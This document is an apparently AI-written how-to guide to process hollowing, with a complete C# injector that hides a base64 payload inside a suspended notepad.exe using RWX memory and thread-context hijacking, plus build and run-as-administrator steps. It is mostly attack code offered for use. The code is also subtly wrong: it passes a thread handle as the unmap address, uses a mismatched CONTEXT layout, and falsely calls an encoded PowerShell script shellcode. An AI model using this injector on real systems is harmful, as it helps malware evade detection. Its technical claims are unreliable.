# Summary
Injecting code into the memory of a legitimate process involves leveraging techniques like process hollowing or reflective DLL injection. These methods allow you to execute code within the context of another process without creating a new process or writing the code to disk.

Here's an overview of how you could perform process hollowing to inject your payload into the memory of a legitimate process:

1. **Prepare the Payload**: Encode your payload (e.g., shellcode) that you want to execute within the target process.

2. **Create a Suspended Process**: Create a legitimate process in a suspended state, which will act as the host for your payload.
   
3. **Unmap the Process Memory**: Unmap the memory space of the suspended process, essentially hollowing it out.

4. **Map the Payload**: Allocate memory within the hollowed process and map your payload into this space.
   
5. **Resume the Process**: Adjust the context of the hollowed process to point to the entry point of your payload and resume its execution.

---
# Execution
To execute the process hollowing code provided, follow these steps:

1. **Compile the C# Program**: You need to compile the C# code into an executable. You can use tools like Visual Studio or the .NET CLI to compile the code.

2. **Replace the Payload**: Ensure that the payload (shellcode) is encoded in base64 format and replace `"BASE64_ENCODED_PAYLOAD_HERE"` in the code with this base64-encoded payload.

3. **Run the Executable with Elevated Privileges**: Since process hollowing involves manipulating another process's memory space, it often requires elevated privileges. Ensure you run the compiled executable with administrator rights.
   
## Step 1: Prepare the Payload
Assume you have some shellcode (e.g., PowerShell script converted to shellcode):

1. **Encode the Shellcode**: Convert your shellcode to a base64 string.

```
# Example PowerShell script
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@

# Convert to base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

2. **Replace Placeholder in Code**: Replace `BASE64_ENCODED_PAYLOAD_HERE` in the C# code with the base64 string obtained from the above step.

## Step 2: Compile the C# Code
Using the .NET CLI:

1. **Create a New Console Project**:

```
dotnet new console -n ProcessHollowing
cd ProcessHollowing
```

2. **Replace Program.cs**: Replace the content of `Program.cs` with the provided C# code.

3. **Add Necessary NuGet Packages** (if needed):
    - Sometimes, you might need to install packages, but for this code, you don't need additional packages.

4. **Compile the Project**:

```
dotnet build -c Release
```

The compiled executable will be in the `bin/Release/net5.0/` or `bin/Release/net6.0/` directory, depending on your .NET version.

## Step 3: Execute the Compiled Executable

1. **Open Command Prompt with Administrator Rights**: Search for "cmd" in the start menu, right-click on Command Prompt, and select "Run as administrator".

2. **Navigate to the Directory Containing the Executable**:

```
cd path\to\ProcessHollowing\bin\Release\net5.0
```

3. **Run the Executable**:

```
ProcessHollowing.exe
```

---
# Example Execution
Below is a simplified walkthrough:

## Step 1: Prepare the payload in PowerShell:

```
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

## Step 2: Replace the placeholder in the C# code:

Replace:

```
byte[] payload = Convert.FromBase64String("BASE64_ENCODED_PAYLOAD_HERE");
```

With:

```
byte[] payload = Convert.FromBase64String("encoded_payload_from_step_1");
```

## Step 3: Compile the code:

- Save the C# code in `Program.cs`.
- Open a terminal or command prompt.
- Navigate to the directory containing `Program.cs`.
- Compile the code using:

```
dotnet build -c Release
```

## Step 4: Run the executable:

- Open Command Prompt with administrator rights.
- Navigate to the directory containing the compiled executable.
- Run the executable:

```
ProcessHollowing.exe
```

This should execute the payload (in this example, a PowerShell script showing a message box) within the context of the hollowed process (e.g., `notepad.exe`).

---
# Example Code
Here's a conceptual example in C# using the CreateProcess, NtUnmapViewOfSection, VirtualAllocEx, WriteProcessMemory, and SetThreadContext functions from the Windows API:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    static void Main(string[] args)
    {
        // Load the payload into a byte array
        byte[] payload = Convert.FromBase64String("BASE64_ENCODED_PAYLOAD_HERE");

        // Prepare the STARTUPINFO and PROCESS_INFORMATION structures
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        // Create a suspended process (e.g., notepad.exe)
        bool success = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
        if (!success)
        {
            Console.WriteLine("Failed to create process");
            return;
        }

        // Unmap the memory of the target process
        NtUnmapViewOfSection(pi.hProcess, pi.hThread);

        // Allocate memory within the target process for the payload
        IntPtr baseAddress = VirtualAllocEx(pi.hProcess, IntPtr.Zero, payload.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

        // Write the payload into the allocated memory space
        WriteProcessMemory(pi.hProcess, baseAddress, payload, payload.Length, out _);

        // Update the context of the target process to point to the payload's entry point
        CONTEXT context = new CONTEXT();
        context.ContextFlags = CONTEXT_FLAGS.CONTROL;
        GetThreadContext(pi.hThread, ref context);
        context.Rip = (ulong)baseAddress;
        SetThreadContext(pi.hThread, ref context);

        // Resume the target process
        ResumeThread(pi.hThread);

        // Close handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT
    {
        public CONTEXT_FLAGS ContextFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
        public ulong SegCs;
        public ulong SegDs;
        public ulong SegEs;
        public ulong SegFs;
        public ulong SegGs;
        public ulong SegSs;
        public ulong EFlags;
        public ulong RcxShadow;
        public ulong RdxShadow;
        public ulong Reserved1;
        public ulong Reserved2;
        public ulong Reserved3;
        public ulong Reserved4;
        public ulong Reserved5;
        public ulong Reserved6;
        public ulong Reserved7;
        public ulong Reserved8;
        public ulong Reserved9;
        public ulong Reserved10;
        public ulong Reserved11;
        public ulong Reserved12;
        public ulong Reserved13;
        public ulong Reserved14;
        public ulong Reserved15;
    }

    [Flags]
    enum ProcessCreationFlags : uint
    {
        CREATE_SUSPENDED = 0x00000004
    }

    [Flags]
    enum AllocationType : uint
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    enum MemoryProtection : uint
    {
        ExecuteReadWrite = 0x40
    }

    [Flags]
    enum CONTEXT_FLAGS : uint
    {
        CONTROL = 0x10001
    }
}
```

Replace `"BASE64_ENCODED_PAYLOAD_HERE"` with your base64-encoded payload. Ensure that you have proper permissions to manipulate the target process. This example demonstrates the general steps involved in process hollowing.